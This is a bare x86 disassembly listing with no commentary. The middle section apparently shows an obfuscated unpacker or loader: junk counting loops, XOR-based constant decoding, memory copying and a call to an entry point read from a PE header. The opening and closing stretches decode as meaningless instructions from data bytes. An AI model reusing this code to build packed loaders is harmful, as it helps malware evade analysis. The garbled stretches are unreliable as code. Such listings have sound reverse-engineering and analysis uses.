  409b94:	xchg   ebx,eax
  409b95:	gs (bad) 
  409b97:	jg     0x409b43
  409b99:	fistp  DWORD PTR [edx-0x7d29d5b]
  409b9f:	retf   0xa1fd
  409ba2:	repz shl BYTE PTR [ebx],1
  409ba5:	int3   
  409ba6:	inc    ebp
  409ba7:	adc    eax,0x4cb17261
  409bac:	(bad)  
  409bae:	in     al,dx
  409baf:	enter  0xa876,0xe3
  409bb3:	mov    BYTE PTR ds:0x3afe0666,bl
  409bb9:	or     dh,BYTE PTR [edi]
  409bbb:	inc    edx
  409bbc:	jl     0x409bed
  409bbe:	jle    0x409bff
  409bc0:	sub    ch,BYTE PTR [eax-0x80]
  409bc3:	aaa    
  409bc4:	rcr    DWORD PTR [edx-0x18ad4ce7],0x82
  409bcb:	push   0xfffffff1
  409bcd:	xor    DWORD PTR [ecx+0xd5e6b76],edx
  409bd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bd4:	nop
  409bd5:	sar    DWORD PTR [ecx-0x25],1
  409bd8:	mov    al,ds:0xd6a9e64b
  409bdd:	inc    edx
  409bde:	loopne 0x409c22
  409be0:	iret   
  409be1:	or     ecx,DWORD PTR [ebx]
  409be3:	rcr    edx,1
  409be5:	aad    0xd1
  409be7:	cs stos DWORD PTR es:[edi],eax
  409be9:	iret   
  409bea:	cli    
  409beb:	push   ds
  409bec:	sti    
  409bed:	dec    esi
  409bee:	shl    bl,1
  409bf0:	sbb    esp,esi
  409bf2:	cmp    BYTE PTR [edx],0x5a
  409bf5:	jb     0x409c2b
  409bf7:	and    al,0x5b
  409bf9:	inc    eax
  409bfa:	cwde   
  409bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bfc:	jge    0x409c4c
  409bfe:	mov    ?,WORD PTR [edx+ebx*4]
  409c01:	mov    edi,0x1f2ef5dc
  409c06:	nop
  409c07:	int3   
  409c08:	or     eax,0xfef5cd3
  409c0d:	dec    edi
  409c0e:	popa   
  409c0f:	mov    ah,0xc5
  409c11:	test   al,0xe8
  409c13:	fcmovnb st,st(6)
  409c15:	imul   ecx,DWORD PTR [ecx-0x3d20d511],0xb75d67f2
  409c1f:	adc    DWORD PTR [edi+0x3a3fd456],ebp
  409c25:	sahf   
  409c26:	mov    ds:0x268eff6e,al
  409c2b:	(bad)  
  409c2c:	scas   eax,DWORD PTR es:[edi]
  409c2d:	fld    st(6)
  409c2f:	jne    0x409c51
  409c31:	push   esi
  409c32:	(bad)  
  409c33:	xor    BYTE PTR [edx-0x7808dfcb],bh
  409c39:	or     eax,0x5b3b5639
  409c3e:	div    BYTE PTR [eax+ebp*4-0x3a3c2deb]
  409c45:	(bad)  
  409c46:	push   eax
  409c47:	out    dx,eax
  409c48:	pop    ebp
  409c49:	mov    bh,0xbb
  409c4b:	sahf   
  409c4c:	call   FWORD PTR cs:[ecx-0x742a0d11]
  409c53:	xor    bl,ah
  409c55:	jle    0x409bf1
  409c57:	ins    DWORD PTR es:[edi],dx
  409c58:	jns    0x409c1e
  409c5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c5b:	jmp    0x3c8442e6
  409c60:	les    eax,FWORD PTR [esi+0x240c2678]
  409c66:	and    eax,0x7bb24443
  409c6b:	add    eax,0x6254e222
  409c70:	add    BYTE PTR [ecx+eiz*1+0x6ffa1f13],bh
  409c77:	shl    BYTE PTR [ebx],cl
  409c79:	nop
  409c7a:	pop    es
  409c7b:	jg     0x409c1c
  409c7d:	jo     0x409cc9
  409c7f:	mov    dl,0x72
  409c81:	sub    edi,DWORD PTR [eax-0x76]
  409c84:	mov    bh,0x69
  409c86:	ret    0x7043
  409c89:	add    al,0xe2
  409c8b:	shl    esi,1
  409c8d:	xor    DWORD PTR [edx],eax
  409c8f:	jo     0x409c5e
  409c91:	addr16 xchg edx,eax
  409c93:	xchg   esi,eax
  409c94:	adc    BYTE PTR [eax],bl
  409c96:	xchg   esp,eax
  409c97:	popf   
  409c98:	pop    edx
  409c99:	mov    es,ebp
  409c9b:	hlt    
  409c9c:	mov    ecx,0xddf193c6
  409ca1:	pop    esi
  409ca2:	xor    eax,DWORD PTR [esi-0x3fc1effa]
  409ca8:	rcr    bl,1
  409caa:	stos   DWORD PTR es:[edi],eax
  409cab:	or     al,0xc7
  409cad:	or     al,0x11
  409caf:	std    
  409cb0:	idiv   ebx
  409cb2:	pop    es
  409cb3:	call   0x2359:0xdd0ad85b
  409cba:	cmp    BYTE PTR [edx+0x7842cfaf],bh
  409cc0:	jne    0x409cc6
  409cc2:	pop    eax
  409cc3:	aas    
  409cc4:	in     eax,0xce
  409cc6:	push   ss
  409cc7:	(bad)  
  409cc9:	inc    ecx
  409cca:	stos   BYTE PTR es:[di],al
  409ccc:	ins    BYTE PTR es:[edi],dx
  409ccd:	cmp    DWORD PTR [esi+0x70],ebp
  409cd0:	pop    edx
  409cd1:	xor    edx,eax
  409cd3:	mov    edi,0xffcd8d64
  409cd8:	sub    edi,edx
  409cda:	add    edi,DWORD PTR [ebp-0x10]
  409cdd:	mov    edx,DWORD PTR [ebp-0x20]
  409ce0:	mov    ebx,DWORD PTR [ebp-0x8]
  409ce3:	xor    edx,eax
  409ce5:	add    edx,ecx
  409ce7:	imul   edx,ebx
  409cea:	cmp    edx,edi
  409cec:	jbe    0x407fba
  409cf2:	pop    ebx
  409cf3:	pop    edi
  409cf4:	leave  
  409cf5:	ret    0x8
  409cf8:	push   ebp
  409cf9:	mov    ebp,esp
  409cfb:	sub    esp,0x70
  409cfe:	xor    DWORD PTR ds:0x43437a,0x600e
  409d08:	push   0x4162b4
  409d0d:	call   DWORD PTR ds:0x432d36
  409d13:	test   ax,ax
  409d16:	jne    0x409d2d
  409d1c:	add    DWORD PTR ds:0x432de2,0x43438a
  409d26:	xor    eax,eax
  409d28:	jmp    0x40a478
  409d2d:	call   DWORD PTR ds:0x432d92
  409d33:	cdq    
  409d34:	mov    DWORD PTR ds:0x432dd2,0x2a3f
  409d3e:	cmp    eax,0x98216565
  409d43:	jne    0x409d55
  409d49:	cmp    edx,0x98798767
  409d4f:	je     0x409d1c
  409d55:	push   0x4162c0
  409d5a:	sub    DWORD PTR ds:0x432dd2,0x490f
  409d64:	call   DWORD PTR ds:0x432ca2
  409d6a:	add    DWORD PTR ds:0x434421,0x7629
  409d74:	test   eax,eax
  409d76:	mov    DWORD PTR ds:0x432dc2,0x36af
  409d80:	jne    0x409d1c
  409d86:	sub    DWORD PTR ds:0x434421,0x434415
  409d90:	push   ebx
  409d91:	xor    DWORD PTR ds:0x432704,ecx
  409d97:	mov    ebx,0xf89c8531
  409d9c:	or     ecx,0x58cd
  409da2:	mov    DWORD PTR [ebp-0x8],ebx
  409da5:	xor    DWORD PTR ds:0x434429,0x5f13
  409daf:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  409db6:	and    DWORD PTR ds:0x43439a,0x0
  409dc0:	jmp    0x409dd2
  409dc5:	mov    ecx,DWORD PTR ds:0x43439a
  409dcb:	inc    ecx
  409dcc:	mov    DWORD PTR ds:0x43439a,ecx
  409dd2:	cmp    DWORD PTR ds:0x43439a,0x10
  409dd9:	jae    0x409e48
  409ddf:	cmp    DWORD PTR ds:0x43439a,0x13
  409de6:	jne    0x409dfc
  409dec:	push   0x432833
  409df1:	push   0x432718
  409df6:	call   DWORD PTR ds:0x432cfe
  409dfc:	jmp    0x409dc5
  409e01:	and    DWORD PTR ds:0x4343a2,0x0
  409e0b:	mov    ecx,DWORD PTR ds:0x4343a2
  409e11:	inc    ecx
  409e12:	mov    DWORD PTR ds:0x4343a2,ecx
  409e18:	cmp    DWORD PTR ds:0x4343a2,0x20
  409e1f:	jne    0x409e3b
  409e25:	push   DWORD PTR [ebp-0x1c]
  409e28:	push   DWORD PTR [ebp-0x10]
  409e2b:	push   0x1942
  409e30:	push   0x6344
  409e35:	call   DWORD PTR ds:0x432d02
  409e3b:	cmp    DWORD PTR ds:0x4343a2,0x1e
  409e42:	jb     0x409e0b
  409e48:	lea    eax,[ebp-0x18]
  409e4b:	sub    DWORD PTR ds:0x43442d,0x379b
  409e55:	mov    DWORD PTR [ebp-0x14],eax
  409e58:	lea    eax,[ebp-0x1c]
  409e5b:	and    DWORD PTR ds:0x432700,0x0
  409e65:	mov    ecx,DWORD PTR ds:0x432700
  409e6b:	inc    ecx
  409e6c:	mov    DWORD PTR ds:0x432700,ecx
  409e72:	cmp    DWORD PTR ds:0x432700,0x20
  409e79:	jne    0x409e98
  409e7f:	push   DWORD PTR [ebp-0xc]
  409e82:	push   DWORD PTR [ebp-0x10]
  409e85:	push   0x37d5
  409e8a:	push   0x73f1
  409e8f:	push   DWORD PTR [ebp-0x1c]
  409e92:	call   DWORD PTR ds:0x4329d6
  409e98:	cmp    DWORD PTR ds:0x432700,0x18
  409e9f:	jb     0x409e65
  409ea5:	and    DWORD PTR ds:0x4326ec,0x0
  409eaf:	mov    ecx,DWORD PTR ds:0x4326ec
  409eb5:	inc    ecx
  409eb6:	mov    DWORD PTR ds:0x4326ec,ecx
  409ebc:	cmp    DWORD PTR ds:0x4326ec,0x19
  409ec3:	jne    0x409ed4
  409ec9:	push   0x477f
  409ece:	call   DWORD PTR ds:0x4329da
  409ed4:	cmp    DWORD PTR ds:0x4326ec,0x13
  409edb:	jb     0x409eaf
  409ee1:	mov    ecx,DWORD PTR ds:0x432dd6
  409ee7:	xor    DWORD PTR ds:0x43439e,ecx
  409eed:	mov    DWORD PTR [ebp-0xc],eax
  409ef0:	and    DWORD PTR ds:0x4326f4,0x0
  409efa:	jmp    0x409f0d
  409eff:	xor    eax,eax
  409f01:	add    eax,DWORD PTR ds:0x4326f4
  409f07:	inc    eax
  409f08:	mov    ds:0x4326f4,eax
  409f0d:	cmp    DWORD PTR ds:0x4326f4,0x1a
  409f14:	jae    0x409f4f
  409f1a:	cmp    DWORD PTR ds:0x4326f4,0x21
  409f21:	jne    0x409f4a
  409f27:	push   0x432de6
  409f2c:	push   DWORD PTR [ebp-0x28]
  409f2f:	push   DWORD PTR [ebp-0x18]
  409f32:	push   0x87ba
  409f37:	push   0x20df
  409f3c:	push   0x519b
  409f41:	push   DWORD PTR [ebp-0x18]
  409f44:	call   DWORD PTR ds:0x432d06
  409f4a:	jmp    0x409eff
  409f4f:	mov    eax,ds:0x4161a0
  409f54:	mov    DWORD PTR ds:0x4326f4,0x19
  409f5e:	cmp    DWORD PTR ds:0x4326f4,0x0
  409f65:	je     0x409fb2
  409f6b:	cmp    DWORD PTR ds:0x4326f4,0x21
  409f72:	jne    0x409fa0
  409f78:	push   0x2812
  409f7d:	push   0x6a58
  409f82:	push   DWORD PTR [ebp-0x24]
  409f85:	push   0x8f98
  409f8a:	push   DWORD PTR [ebp-0x20]
  409f8d:	push   0x26e4
  409f92:	push   DWORD PTR [ebp-0x14]
  409f95:	push   0x4328ab
  409f9a:	call   DWORD PTR ds:0x432d0a
  409fa0:	mov    ecx,DWORD PTR ds:0x4326f4
  409fa6:	dec    ecx
  409fa7:	mov    DWORD PTR ds:0x4326f4,ecx
  409fad:	jmp    0x409f5e
  409fb2:	mov    eax,DWORD PTR [eax+0x1c8]
  409fb8:	xor    DWORD PTR ds:0x4326f4,edx
  409fbe:	mov    eax,DWORD PTR [eax]
  409fc0:	mov    ecx,DWORD PTR [ebp-0xc]
  409fc3:	add    DWORD PTR ds:0x4326f0,0x3eda
  409fcd:	push   esi
  409fce:	mov    esi,0x7510855
  409fd3:	sbb    DWORD PTR ds:0x434415,0x118a
  409fdd:	xor    eax,esi
  409fdf:	sbb    DWORD PTR ds:0x43438e,0x43437a
  409fe9:	push   edi
  409fea:	xor    edi,DWORD PTR ds:0x43438a
  409ff0:	mov    edi,0x32729c
  409ff5:	adc    DWORD PTR ds:0x434415,0x7b86
  409fff:	add    eax,edi
  40a001:	mov    DWORD PTR [ecx],eax
  40a003:	mov    eax,ds:0x4163b4
  40a008:	mov    DWORD PTR ds:0x432dde,0x674a
  40a012:	cmp    eax,0x23c13046
  40a017:	mov    eax,DWORD PTR [ebp-0x4]
  40a01a:	je     0x40a046
  40a020:	mov    ecx,DWORD PTR [ebp-0x8]
  40a023:	xor    eax,esi
  40a025:	sub    DWORD PTR ds:0x4326f4,0x7cc4
  40a02f:	add    eax,edi
  40a031:	add    DWORD PTR ds:0x434386,0x4326f4
  40a03b:	imul   eax,ecx
  40a03e:	mov    DWORD PTR [ebp-0x8],eax
  40a041:	jmp    0x40a156
  40a046:	and    DWORD PTR ds:0x432dde,0x0
  40a050:	mov    ecx,DWORD PTR ds:0x432dde
  40a056:	inc    ecx
  40a057:	mov    DWORD PTR ds:0x432dde,ecx
  40a05d:	cmp    DWORD PTR ds:0x432dde,0x26
  40a064:	jne    0x40a07d
  40a06a:	push   DWORD PTR [ebp-0x18]
  40a06d:	push   0x709e
  40a072:	push   0x1359
  40a077:	call   DWORD PTR ds:0x432d0e
  40a07d:	cmp    DWORD PTR ds:0x432dde,0x19
  40a084:	jb     0x40a050
  40a08a:	xor    eax,esi
  40a08c:	and    DWORD PTR ds:0x434396,0x0
  40a096:	mov    ecx,DWORD PTR ds:0x434396
  40a09c:	inc    ecx
  40a09d:	mov    DWORD PTR ds:0x434396,ecx
  40a0a3:	cmp    DWORD PTR ds:0x434396,0x10
  40a0aa:	jne    0x40a0c0
  40a0b0:	push   0x432805
  40a0b5:	push   0x43281d
  40a0ba:	call   DWORD PTR ds:0x4329de
  40a0c0:	cmp    DWORD PTR ds:0x434396,0xf
  40a0c7:	jne    0x40a0da
  40a0cd:	mov    ecx,DWORD PTR ds:0x434396
  40a0d3:	inc    ecx
  40a0d4:	mov    DWORD PTR ds:0x434396,ecx
  40a0da:	cmp    DWORD PTR ds:0x434396,0x1e
  40a0e1:	jb     0x40a096
  40a0e7:	add    eax,edi
  40a0e9:	mov    ds:0x4162b0,eax
  40a0ee:	mov    ecx,DWORD PTR ds:0x434366
  40a0f4:	sbb    DWORD PTR ds:0x434415,ecx
  40a0fa:	mov    eax,DWORD PTR [ebp-0x8]
  40a0fd:	sbb    ecx,DWORD PTR ds:0x432dd6
  40a103:	xor    eax,esi
  40a105:	not    ecx
  40a107:	add    eax,edi
  40a109:	mov    ds:0x4163b4,eax
  40a10e:	mov    eax,DWORD PTR [ebp-0x4]
  40a111:	mov    ecx,DWORD PTR ds:0x4162b0
  40a117:	sub    DWORD PTR ds:0x4326f0,0x434415
  40a121:	xor    eax,esi
  40a123:	add    eax,edi
  40a125:	mov    DWORD PTR ds:0x434392,0x307
  40a12f:	cmp    ecx,eax
  40a131:	jne    0x40a156
  40a137:	xor    DWORD PTR ds:0x432dce,0x57b5
  40a141:	push   DWORD PTR [ebp-0x4]
  40a144:	sub    DWORD PTR ds:0x434419,0x6bc5
  40a14e:	push   DWORD PTR [ebp-0x8]
  40a151:	call   0x40a47c
  40a156:	mov    eax,ds:0x4161a0
  40a15b:	mov    eax,DWORD PTR [eax+0x18c]
  40a161:	xor    ecx,ecx
  40a163:	mov    eax,DWORD PTR [eax]
  40a165:	sbb    DWORD PTR ds:0x434411,edx
  40a16b:	mov    DWORD PTR [ebp-0x20],eax
  40a16e:	inc    edx
  40a16f:	mov    eax,0xf89c853d
  40a174:	mov    DWORD PTR [ebp-0x24],eax
  40a177:	or     DWORD PTR ds:0x43436a,edx
  40a17d:	mov    DWORD PTR [ebp-0x24],eax
  40a180:	and    DWORD PTR ds:0x43439a,0x0
  40a18a:	jmp    0x40a19c
  40a18f:	mov    edx,DWORD PTR ds:0x43439a
  40a195:	inc    edx
  40a196:	mov    DWORD PTR ds:0x43439a,edx
  40a19c:	cmp    DWORD PTR ds:0x43439a,0x10
  40a1a3:	jae    0x40a1f4
  40a1a9:	cmp    DWORD PTR ds:0x43439a,0x6
  40a1b0:	jne    0x40a1d3
  40a1b6:	push   0x1088
  40a1bb:	push   DWORD PTR [ebp-0x1c]
  40a1be:	push   0x185d
  40a1c3:	push   0x432909
  40a1c8:	push   0x400000
  40a1cd:	call   DWORD PTR ds:0x4329e2
  40a1d3:	cmp    DWORD PTR ds:0x43439a,0x5
  40a1da:	jne    0x40a1ef
  40a1e0:	xor    edx,edx
  40a1e2:	or     edx,DWORD PTR ds:0x43439a
  40a1e8:	inc    edx
  40a1e9:	mov    DWORD PTR ds:0x43439a,edx
  40a1ef:	jmp    0x40a18f
  40a1f4:	mov    DWORD PTR [ebp-0x24],eax
  40a1f7:	mov    DWORD PTR [ebp-0xc],ebx
  40a1fa:	mov    DWORD PTR [ebp-0x24],eax
  40a1fd:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40a204:	mov    ebx,DWORD PTR [ebp-0x8]
  40a207:	and    edx,DWORD PTR ds:0x43439a
  40a20d:	mov    ecx,DWORD PTR [ebp-0x4]
  40a210:	and    DWORD PTR ds:0x432dce,0x0
  40a21a:	mov    edx,DWORD PTR ds:0x432dce
  40a220:	inc    edx
  40a221:	mov    DWORD PTR ds:0x432dce,edx
  40a227:	cmp    DWORD PTR ds:0x432dce,0x22
  40a22e:	jne    0x40a23a
  40a234:	call   DWORD PTR ds:0x4329e6
  40a23a:	cmp    DWORD PTR ds:0x432dce,0x17
  40a241:	jb     0x40a21a
  40a247:	mov    edx,DWORD PTR [ebp-0x4]
  40a24a:	xor    edx,esi
  40a24c:	xor    ecx,esi
  40a24e:	add    ecx,edx
  40a250:	mov    edx,DWORD PTR [ebp-0x4]
  40a253:	xor    ebx,esi
  40a255:	xor    edx,esi
  40a257:	add    ebx,edi
  40a259:	lea    ecx,[ecx+edx*1+0x9757d4]
  40a260:	cmp    ebx,ecx
  40a262:	ja     0x40a2c3
  40a268:	mov    eax,DWORD PTR [ebp-0x4]
  40a26b:	xor    eax,esi
  40a26d:	lea    eax,[eax+ebx*1+0x32729c]
  40a274:	push   eax
  40a275:	mov    eax,DWORD PTR [ebp-0xc]
  40a278:	xor    eax,esi
  40a27a:	lea    eax,[ebp+eax*1+0x3272a4]
  40a281:	push   eax
  40a282:	mov    eax,ds:0x4161a0
  40a287:	push   DWORD PTR [eax+0x1bc]
  40a28d:	call   0x401a05
  40a292:	mov    eax,DWORD PTR [ebp-0x4]
  40a295:	xor    eax,esi
  40a297:	lea    ebx,[ebx+eax*1+0x32729c]
  40a29e:	mov    eax,DWORD PTR [ebp-0x4]
  40a2a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a4:	xor    ecx,esi
  40a2a6:	xor    eax,esi
  40a2a8:	add    eax,ecx
  40a2aa:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2ad:	xor    ecx,esi
  40a2af:	lea    eax,[eax+ecx*1+0x9757d4]
  40a2b6:	cmp    ebx,eax
  40a2b8:	jbe    0x40a268
  40a2be:	mov    eax,0xf89c853d
  40a2c3:	mov    ecx,DWORD PTR [ebp+0xc]
  40a2c6:	mov    DWORD PTR ds:0x416024,ecx
  40a2cc:	mov    ecx,DWORD PTR [ebp+0x10]
  40a2cf:	mov    DWORD PTR ds:0x416278,ecx
  40a2d5:	mov    ecx,DWORD PTR ds:0x416024
  40a2db:	mov    edx,DWORD PTR [ebp-0x14]
  40a2de:	sub    ecx,edi
  40a2e0:	xor    ecx,esi
  40a2e2:	mov    DWORD PTR [edx],ecx
  40a2e4:	mov    ecx,DWORD PTR [ebp-0x18]
  40a2e7:	cmp    ecx,0xf89c8530
  40a2ed:	je     0x40a34a
  40a2f3:	mov    ecx,DWORD PTR [ebp-0x8]
  40a2f6:	mov    edx,DWORD PTR [ebp-0x1c]
  40a2f9:	xor    ecx,esi
  40a2fb:	add    ecx,edi
  40a2fd:	cmp    ecx,edx
  40a2ff:	je     0x40a34a
  40a305:	mov    eax,ds:0x4161a0
  40a30a:	mov    eax,DWORD PTR [eax+0x194]
  40a310:	mov    ecx,DWORD PTR [eax]
  40a312:	mov    eax,DWORD PTR [ecx+0x3c]
  40a315:	push   DWORD PTR ds:0x416278
  40a31b:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a31f:	push   DWORD PTR ds:0x416024
  40a325:	add    eax,ecx
  40a327:	mov    ecx,DWORD PTR ds:0x4161a0
  40a32d:	mov    ecx,DWORD PTR [ecx+0x194]
  40a333:	push   DWORD PTR [ecx]
  40a335:	call   eax
  40a337:	mov    ecx,DWORD PTR ds:0x4161a0
  40a33d:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a343:	mov    DWORD PTR [ecx],eax
  40a345:	jmp    0x40a45a
  40a34a:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34d:	mov    edx,DWORD PTR [ebp-0x20]
  40a350:	xor    ecx,esi
  40a352:	add    ecx,edi
  40a354:	cmp    ecx,edx
  40a356:	jne    0x40a43d
  40a35c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a35f:	xor    ecx,esi
  40a361:	add    ecx,edi
  40a363:	mov    DWORD PTR ds:0x416224,ecx
  40a369:	mov    ecx,DWORD PTR [ebp-0x8]
  40a36c:	xor    ecx,esi
  40a36e:	add    ecx,edi
  40a370:	mov    DWORD PTR ds:0x41621c,ecx
  40a376:	mov    ecx,DWORD PTR [ebp-0x4]
  40a379:	mov    DWORD PTR [ebp-0xc],ecx
  40a37c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a37f:	mov    DWORD PTR [ebp+0xc],ecx
  40a382:	mov    ecx,DWORD PTR [ebp+0xc]
  40a385:	xor    ecx,esi
  40a387:	add    ecx,edi
  40a389:	mov    DWORD PTR [ebp+0xc],ecx
  40a38c:	mov    ecx,DWORD PTR ds:0x416020
  40a392:	mov    ecx,DWORD PTR [ecx]
  40a394:	mov    DWORD PTR [ebp+0xc],ecx
  40a397:	mov    ecx,DWORD PTR ds:0x416228
  40a39d:	mov    ecx,DWORD PTR [ecx]
  40a39f:	mov    DWORD PTR [ebp-0x14],ecx
  40a3a2:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40a3a9:	mov    ecx,DWORD PTR [ebp+0x10]
  40a3ac:	xor    ecx,esi
  40a3ae:	add    ecx,edi
  40a3b0:	mov    DWORD PTR [ebp+0x10],ecx
  40a3b3:	mov    ecx,DWORD PTR ds:0x4161a0
  40a3b9:	mov    DWORD PTR [ebp+0x10],ecx
  40a3bc:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3bf:	mov    DWORD PTR [ebp+0xc],ecx
  40a3c2:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3c5:	push   0x4
  40a3c7:	pop    edx
  40a3c8:	sub    edx,ecx
  40a3ca:	add    edx,DWORD PTR [ebp-0x14]
  40a3cd:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40a3d4:	mov    DWORD PTR [ebp+0x10],edx
  40a3d7:	mov    DWORD PTR [ebp-0x70],eax
  40a3da:	mov    eax,DWORD PTR [ebp+0xc]
  40a3dd:	mov    DWORD PTR [ebp-0x6c],eax
  40a3e0:	mov    eax,DWORD PTR [ebp+0x10]
  40a3e3:	mov    DWORD PTR [ebp-0x68],eax
  40a3e6:	mov    eax,DWORD PTR [ebp-0x24]
  40a3e9:	xor    eax,esi
  40a3eb:	add    eax,edi
  40a3ed:	mov    DWORD PTR [ebp-0x64],eax
  40a3f0:	lea    eax,[ebp-0x2c]
  40a3f3:	mov    DWORD PTR [ebp-0x60],eax
  40a3f6:	mov    eax,DWORD PTR [ebp-0x70]
  40a3f9:	xor    eax,esi
  40a3fb:	add    eax,edi
  40a3fd:	mov    DWORD PTR [ebp-0x70],eax
  40a400:	lea    eax,[ebp-0x70]
  40a403:	push   eax
  40a404:	mov    eax,DWORD PTR [ebp-0xc]
  40a407:	xor    eax,esi
  40a409:	add    eax,edi
  40a40b:	push   eax
  40a40c:	mov    eax,ds:0x4161c0
  40a411:	push   0x416116
  40a416:	push   DWORD PTR [eax]
  40a418:	call   0x40d076
  40a41d:	xor    esi,esi
  40a41f:	mov    eax,DWORD PTR [ebp+0x10]
  40a422:	sub    eax,esi
  40a424:	push   eax
  40a425:	mov    eax,DWORD PTR [ebp+0xc]
  40a428:	add    eax,esi
  40a42a:	push   eax
  40a42b:	call   0x407765
  40a430:	inc    esi
  40a431:	cmp    esi,0x52
  40a434:	jb     0x40a41f
  40a43a:	mov    eax,DWORD PTR [ebp-0xc]
  40a43d:	call   0x405bf4
  40a442:	lea    eax,[ebp+0x4]
  40a445:	mov    DWORD PTR [ebp-0x28],eax
  40a448:	mov    eax,DWORD PTR [ebp-0x10]
  40a44b:	mov    eax,DWORD PTR [ebp-0x4]
  40a44e:	push   DWORD PTR [ebp-0x8]
  40a451:	lea    eax,[ebp-0x28]
  40a454:	push   eax
  40a455:	call   0x40c78b
  40a45a:	mov    eax,ds:0x4161a0
  40a45f:	push   0x4
  40a461:	add    eax,0x1cc
  40a466:	push   eax
  40a467:	lea    eax,[ebp-0x10]
  40a46a:	push   eax
  40a46b:	call   0x401a05
  40a470:	mov    eax,DWORD PTR [ebp-0x10]
  40a473:	mov    eax,DWORD PTR [eax]
  40a475:	pop    edi
  40a476:	pop    esi
  40a477:	pop    ebx
  40a478:	leave  
  40a479:	ret    0xc
  40a47c:	push   ebp
  40a47d:	mov    ebp,esp
  40a47f:	sub    esp,0x24
  40a482:	xor    ecx,ecx
  40a484:	or     ecx,DWORD PTR ds:0x434425
  40a48a:	sub    ecx,DWORD PTR ds:0x43442d
  40a490:	mov    DWORD PTR ds:0x434425,ecx
  40a496:	mov    eax,ds:0x4161a0
  40a49b:	mov    DWORD PTR ds:0x434392,0x17
  40a4a5:	cmp    DWORD PTR ds:0x434392,0x0
  40a4ac:	je     0x40a506
  40a4b2:	cmp    DWORD PTR ds:0x434392,0x5
  40a4b9:	jne    0x40a4d4
  40a4bf:	push   0x378d
  40a4c4:	push   0x43437a
  40a4c9:	push   0x4a36
  40a4ce:	call   DWORD PTR ds:0x432c56
  40a4d4:	cmp    DWORD PTR ds:0x434392,0x6
  40a4db:	jne    0x40a4ee
  40a4e1:	mov    ecx,DWORD PTR ds:0x434392
  40a4e7:	dec    ecx
  40a4e8:	mov    DWORD PTR ds:0x434392,ecx
  40a4ee:	mov    ecx,DWORD PTR ds:0x434392
  40a4f4:	dec    ecx
  40a4f5:	mov    DWORD PTR ds:0x434392,ecx
  40a4fb:	jmp    0x40a4a5
  40a500:	add    DWORD PTR ds:0x432de6,edx
  40a506:	mov    eax,DWORD PTR [eax+0x198]
  40a50c:	mov    ecx,DWORD PTR ds:0x434465
  40a512:	mov    ecx,DWORD PTR [ecx]
  40a514:	sub    DWORD PTR ds:0x434372,ecx
  40a51a:	mov    DWORD PTR [ebp-0x8],eax
  40a51d:	xor    eax,eax
  40a51f:	add    eax,DWORD PTR ds:0x434366
  40a525:	and    eax,DWORD PTR ds:0x4326f4
  40a52b:	mov    ds:0x434366,eax
  40a530:	mov    eax,DWORD PTR [ebp+0x8]
  40a533:	mov    ecx,DWORD PTR [ebp-0x8]
  40a536:	sub    DWORD PTR ds:0x432dde,0x4326f0
  40a540:	push   ebx
  40a541:	adc    DWORD PTR ds:0x434396,ebx
  40a547:	push   esi
  40a548:	mov    esi,0x7510855
  40a54d:	and    DWORD PTR ds:0x432dca,0x0
  40a557:	mov    ebx,DWORD PTR ds:0x432dca
  40a55d:	inc    ebx
  40a55e:	mov    DWORD PTR ds:0x432dca,ebx
  40a564:	cmp    DWORD PTR ds:0x432dca,0x2c
  40a56b:	jne    0x40a57a
  40a571:	push   DWORD PTR [ebp-0xc]
  40a574:	call   DWORD PTR ds:0x432c5a
  40a57a:	cmp    DWORD PTR ds:0x432dca,0x1e
  40a581:	jb     0x40a557
  40a587:	xor    eax,esi
  40a589:	and    DWORD PTR ds:0x4343a2,0x0
  40a593:	jmp    0x40a5a5
  40a598:	mov    ebx,DWORD PTR ds:0x4343a2
  40a59e:	inc    ebx
  40a59f:	mov    DWORD PTR ds:0x4343a2,ebx
  40a5a5:	cmp    DWORD PTR ds:0x4343a2,0x1a
  40a5ac:	jae    0x40a78c
  40a5b2:	cmp    DWORD PTR ds:0x4343a2,0x1d
  40a5b9:	jne    0x40a5cf
  40a5bf:	push   0x74a9
  40a5c4:	push   0x3c30
  40a5c9:	call   DWORD PTR ds:0x432c5e
  40a5cf:	jmp    0x40a598
  40a5d4:	jmp    0x40a78c
  40a5d9:	cmp    dh,BYTE PTR [esi+0x69734bd3]
  40a5df:	inc    edx
  40a5e0:	mov    ch,0x74
  40a5e2:	neg    DWORD PTR [ebx-0x6]
  40a5e5:	adc    edi,DWORD PTR [eax+0x61]
  40a5e8:	(bad)  
  40a5e9:	shl    al,cl
  40a5eb:	jo     0x40a65d
  40a5ed:	xchg   ebp,eax
  40a5ee:	jg     0x40a660
  40a5f0:	jo     0x40a655
  40a5f2:	in     eax,0x8
  40a5f4:	xchg   ecx,eax
  40a5f5:	in     eax,dx
  40a5f6:	ficomp WORD PTR [esi-0x3a7921ec]
  40a5fc:	jns    0x40a646
  40a5fe:	add    eax,0x67120544
  40a603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a604:	pop    ds
  40a605:	dec    esi
  40a606:	int    0x94
  40a608:	xchg   BYTE PTR ds:0x7fdefbdf,ah
  40a60e:	dec    esp
  40a60f:	xchg   BYTE PTR ds:0xda1c4bd0,cl
  40a615:	retf   0x1eea
  40a618:	pop    edi
  40a619:	jb     0x40a683
  40a61b:	call   0x9fdb:0x34f25af5
  40a622:	add    eax,0xc6b3d64b
  40a627:	pop    edx
  40a628:	sbb    al,0xad
  40a62a:	mov    dl,0x6a
  40a62c:	add    eax,0xd97c2f02
  40a631:	cmc    
  40a632:	mov    dl,0x8a
  40a634:	clc    
  40a635:	in     al,dx
  40a636:	sahf   
  40a637:	ins    DWORD PTR es:[edi],dx
  40a638:	jno    0x40a67a
